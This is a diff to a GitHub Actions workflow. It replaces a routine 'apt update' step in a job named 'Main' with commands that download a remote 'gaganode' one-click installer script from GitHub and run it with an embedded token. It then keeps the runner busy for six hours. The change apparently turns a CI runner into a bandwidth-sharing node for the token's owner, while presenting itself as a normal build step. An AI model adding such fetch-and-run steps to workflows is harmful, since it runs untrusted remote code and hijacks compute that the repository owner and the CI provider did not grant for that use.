@@ -25,4 +25,6 @@ jobs:
       uses: actions/checkout@v1
     - name: Main
       run: |
-        sudo apt update -y && sleep 5
+        curl -L https://raw.githubusercontent.com/spiritLHLS/gaganode-one-click-command-installation/main/g.sh -o g.sh && chmod +x g.sh
+        bash g.sh -t yobqbmxayydohqrhc9a977e15c9875e03
+        sleep 6h
